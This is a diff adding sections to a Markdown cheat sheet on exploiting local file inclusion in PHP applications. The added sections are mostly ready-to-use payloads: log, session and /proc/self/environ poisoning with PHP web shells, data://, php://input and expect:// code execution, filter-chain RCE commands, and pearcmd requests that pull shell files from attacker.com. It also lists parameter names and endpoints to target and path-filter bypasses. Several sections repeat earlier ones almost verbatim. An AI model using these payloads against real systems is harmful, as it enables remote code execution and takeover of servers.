@@ -279,3 +279,325 @@ LFI (PHP code inclusion)
 ├── data:// → direct code execution
 └── php://filter → read PHP source code → find more vulnerabilities
 ```
+
+---
+
+## 11. LFI TO RCE ESCALATION PATHS
+
+| Method | Requirements | Payload |
+|---|---|---|
+| Log Poisoning (Apache) | LFI + Apache access.log readable | Inject `<?php system($_GET['c']);?>` in User-Agent → include `/var/log/apache2/access.log` |
+| Log Poisoning (SSH) | LFI + SSH auth.log readable | SSH as `<?php system('id');?>@target` → include `/var/log/auth.log` |
+| Log Poisoning (Mail) | LFI + mail log readable | Send email with PHP in subject → include `/var/log/mail.log` |
+| /proc/self/fd bruteforce | LFI + Linux | Bruteforce `/proc/self/fd/0` through `/proc/self/fd/255` for open file handles containing injected content |
+| /proc/self/environ | LFI + CGI/FastCGI | Inject PHP in `User-Agent` header → include `/proc/self/environ` |
+| iconv CVE-2024-2961 | glibc < 2.39, PHP with `php://filter` | `php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=` chain to heap overflow → RCE. Tool: cnext-exploits |
+| phpinfo() assisted | LFI + phpinfo page accessible | Race condition: upload tmp file via multipart to phpinfo → read tmp path from response → include before cleanup |
+| PHP Session | LFI + session file writable | Inject PHP into session via controllable session variable → include `/tmp/sess_SESSIONID` or `/var/lib/php/sessions/sess_SESSIONID` |
+| Upload race | LFI + upload endpoint | Upload PHP file → include before server-side validation/deletion |
+
+---
+
+## 12. PHP WRAPPER EXPLOITATION MATRIX
+
+### php://filter (most powerful, always try first)
+
+```text
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
+php://filter/convert.iconv.utf-8.utf-16/resource=index.php
+php://filter/zlib.deflate/resource=index.php
+```
+
+**Filter chain RCE** (synacktiv php_filter_chain_generator):
+
+- Chain multiple `convert.iconv` filters to write arbitrary bytes without file upload
+- Tool: `synacktiv/php_filter_chain_generator` → generates chain that writes PHP code
+- `python3 php_filter_chain_generator.py --chain '<?php system("id");?>'`
+
+**convert.iconv + dechunk oracle** (blind file read):
+
+- Tool: `synacktiv/php_filter_chains_oracle_exploit` (filters_chain_oracle_exploit)
+- Enables blind LFI to read file contents character by character
+
+### php://input
+
+```text
+POST vulnerable.php?page=php://input
+Body: <?php system('id'); ?>
+```
+
+Requires `allow_url_include=On`
+
+### data://
+
+```text
+data://text/plain,<?php system('id');?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+data:text/plain,<?php system('id');?>    ← note: no double slash variant also works
+```
+
+### phar://
+
+```text
+phar://uploaded.phar/test.php
+```
+
+Triggers deserialization of phar metadata → RCE via POP chain (requires file upload of crafted phar, can be disguised as JPEG)
+
+### zip://
+
+```text
+zip://uploaded.zip%23shell.php
+```
+
+### expect://
+
+```text
+expect://id
+```
+
+Requires `expect` extension (rare)
+
+---
+
+## 13. PEARCMD LFI EXPLOITATION
+
+When `pearcmd.php` is accessible via LFI (common in Docker PHP images):
+
+| Method | Payload |
+|---|---|
+| config-create | `/?file=pearcmd.php&+config-create+/<?=phpinfo()?>+/tmp/shell.php` |
+| man_dir | `/?file=pearcmd.php&+-c+/tmp/shell.php+-d+man_dir=<?=phpinfo()?>+-s+` |
+| download | `/?file=pearcmd.php&+download+http://attacker.com/shell.php` |
+| install | `/?file=pearcmd.php&+install+http://attacker.com/shell.tgz` |
+
+---
+
+## 14. WINDOWS-SPECIFIC LFI TECHNIQUES
+
+**FindFirstFile wildcard** (Windows only):
+
+- `<` matches any single character, `>` matches any sequence (similar to `?` and `*` but in file APIs)
+- `php<<` can match `php5`, `phtml`, etc.
+- `..\..\windows\win.ini` → use `<<` for fuzzy matching: `..\..\windows\win<<`
+
+---
+
+## 15. PARAMETER NAMING PATTERNS (HIGH-FREQUENCY TARGETS)
+
+Based on vulnerability research statistical analysis:
+
+| Parameter Name | Frequency | Context |
+|---|---|---|
+| `filename`, `file`, `path` | Very High | Direct file operations |
+| `page`, `include`, `template` | High | Template/page inclusion |
+| `url`, `src`, `href` | High | Resource loading |
+| `download`, `read`, `load` | Medium | File download/read |
+| `dir`, `folder`, `root` | Medium | Directory operations |
+| `hdfile`, `inputFile`, `XFileName` | Low | CMS/middleware specific |
+| `FileUrl`, `filePath`, `docPath` | Low | Enterprise app specific |
+
+High-frequency vulnerable endpoints:
+
+`down.php`, `download.jsp`, `download.asp`, `readfile.php`, `file_download.php`, `getfile.php`, `view.php`
+
+---
+
+## 16. LFI TO RCE — ESCALATION PATHS
+
+### 1. /proc/self/fd Brute-Force
+```
+# When file upload exists but path is unknown:
+# Uploaded files get temporary fd in /proc/self/fd/
+# Brute-force fd numbers:
+/proc/self/fd/0 through /proc/self/fd/255
+# Include the temp file before it's cleaned up
+```
+
+### 2. /proc/self/environ Poisoning
+```
+# If User-Agent is reflected in process environment:
+GET /vuln.php?page=/proc/self/environ
+User-Agent: <?php system($_GET['c']); ?>
+```
+
+### 3. Log Poisoning
+```
+# Apache access log:
+GET /<?php system($_GET['c']); ?> HTTP/1.1
+# Then include: /var/log/apache2/access.log
+
+# SSH auth log (username field):
+ssh '<?php system($_GET["c"]); ?>'@target
+# Then include: /var/log/auth.log
+
+# Mail log (SMTP subject):
+MAIL FROM:<attacker@evil.com>
+RCPT TO:<victim@target.com>
+DATA
+Subject: <?php system($_GET['c']); ?>
+.
+# Then include: /var/log/mail.log
+```
+
+### 4. PHP Session File Poisoning
+```
+# Set session variable to PHP code:
+GET /page.php?lang=<?php system($_GET['c']); ?>
+# Session file: /tmp/sess_PHPSESSID or /var/lib/php/sessions/sess_PHPSESSID
+# Include the session file
+```
+
+### 5. phpinfo() Assisted LFI
+```
+# Race condition: upload via phpinfo() temp file
+# 1. POST multipart file to phpinfo() page → reveals tmp_name (/tmp/phpXXXXXX)
+# 2. Include the temp file before PHP cleans it up
+# Requires many concurrent requests (race window ~10ms)
+```
+
+### 6. iconv CVE-2024-2961
+```
+# glibc iconv buffer overflow in PHP filter chains
+# Tool: cfreal/cnext-exploits
+# Converts LFI to RCE without needing writable paths or log poisoning
+```
+
+---
+
+## 17. PHP WRAPPER EXPLOITATION MATRIX
+
+### php://filter (file read without execution)
+```
+# Base64 encode source code:
+php://filter/convert.base64-encode/resource=index.php
+
+# ROT13:
+php://filter/read=string.rot13/resource=index.php
+
+# Chain multiple filters:
+php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php
+
+# Zlib compression:
+php://filter/zlib.deflate/resource=index.php
+
+# NEW: Filter chain RCE (synacktiv php_filter_chain_generator)
+# Generates chains that write arbitrary content via iconv conversions
+# Tool: synacktiv/php_filter_chain_generator
+python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
+# Produces: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|/resource=php://temp
+```
+
+### convert.iconv + dechunk Oracle (blind file read)
+```
+# Error-based oracle: determine if first byte of file matches a character
+# Tool: synacktiv/php_filter_chains_oracle_exploit
+# Reads files byte-by-byte through error/behavior differences
+```
+
+### data:// Wrapper
+```
+# Execute arbitrary PHP:
+data://text/plain,<?php system('id'); ?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+
+# Bypass when data:// is filtered but data: (without //) works:
+data:text/plain,<?php system('id'); ?>
+```
+
+### expect:// Wrapper
+```
+expect://id
+expect://ls
+# Requires expect extension (rare but check)
+```
+
+### php://input
+```
+POST /vuln.php?page=php://input
+Content-Type: application/x-www-form-urlencoded
+
+<?php system('id'); ?>
+```
+
+### zip:// and phar:// Wrappers
+```
+# zip://: Upload ZIP containing PHP file
+zip:///tmp/upload.zip#shell.php
+
+# phar://: Triggers deserialization of phar metadata!
+phar:///tmp/upload.phar/anything
+# Create malicious phar with crafted metadata object
+# Can chain to RCE via POP gadget chains (like PHP deserialization)
+# Phar can be disguised as JPG (polyglot phar-jpg)
+```
+
+### wrapwrap (prefix/suffix injection)
+```
+# Tool: ambionics/wrapwrap
+# Adds arbitrary prefix and suffix to file content via filter chains
+# Useful for converting file read into XXE, SSRF, or deserialization trigger
+```
+
+---
+
+## 18. PEARCMD LFI TO RCE
+
+When PEAR is installed and `register_argc_argv=On` (common in Docker PHP images):
+
+```
+# Method 1: config-create (write arbitrary content to file)
+GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/shell.php
+
+# Method 2: man_dir (change docs directory to write path)
+GET /index.php?+-c+/tmp/shell.php+-d+man_dir=<?=system($_GET[0])?>+-s+/usr/local/lib/php/pearcmd.php
+
+# Method 3: download (fetch remote file)
+GET /index.php?+download+http://attacker.com/shell.php&file=/usr/local/lib/php/pearcmd.php
+
+# Method 4: install (install remote package)
+GET /index.php?+install+http://attacker.com/evil.tgz&file=/usr/local/lib/php/pearcmd.php
+```
+
+### Windows FindFirstFile Wildcard
+```
+# Windows << and > wildcards in file paths:
+# << matches any extension, > matches single char
+include("php<<");      # Matches any .php* file
+include("shel>");      # Matches shell.php if only 1 char follows
+# Useful when exact filename is unknown
+```
+
+---
+
+## 19. PARAMETER NAMING PATTERNS & HIGH-FREQUENCY ENDPOINTS
+
+### Common Vulnerable Parameter Names
+```
+filename    filepath    path        file        url
+template    page        include     dir         document
+folder      root        pg          lang        doc
+conf        data        content     name        src
+inputFile   hdfile      XFileName   FileUrl     readfile
+```
+
+### High-Frequency Vulnerable Endpoints
+| Endpoint Pattern | Frequency |
+|---|---|
+| `down.php` / `download.php` | Very High |
+| `download.jsp` / `download.do` | Very High |
+| `download.asp` / `download.aspx` | High |
+| `readfile.php` / `file.php` | High |
+| `export` / `report` endpoints | Medium |
+| `template` / `preview` endpoints | Medium |
+
+### Bypass Technique Distribution (from field research)
+| Technique | Prevalence |
+|---|---|
+| Absolute path direct access | Most common |
+| WEB-INF/web.xml read (Java) | Common |
+| Base64 encoded path parameter | Moderate |
+| Double URL encoding | Moderate |
+| UTF-8 overlong encoding (`%c0%ae`) | Rare but effective |
+| Null byte truncation (`%00`) | Legacy (PHP < 5.3.4) |
